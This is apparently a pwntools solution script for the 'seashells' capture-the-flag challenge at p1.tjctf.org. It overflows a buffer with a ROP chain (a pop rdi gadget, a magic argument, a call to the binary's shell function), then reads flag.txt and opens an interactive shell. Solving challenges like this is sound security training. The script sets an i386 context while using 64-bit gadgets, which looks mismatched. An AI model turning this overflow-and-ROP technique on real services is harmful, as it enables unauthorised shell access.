#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host p1.tjctf.org --port 8009
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = ELF('./seashells')
context.terminal = ['xfce4-terminal','-e']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'p1.tjctf.org'
port = int(args.PORT or 8009)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
rop = ROP(exe)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
shell = exe.sym['shell']
io.sendline(b'A'*0x12 + p64(pop_rdi) + p64(0xDEADCAFEBABEBEEF) + p64(shell) + p64(pop_rdi) + p64(0xDEADCAFEBABEBEEF) + p64(shell))
io.sendline('cat flag.txt')
print(io.recv())
io.interactive()

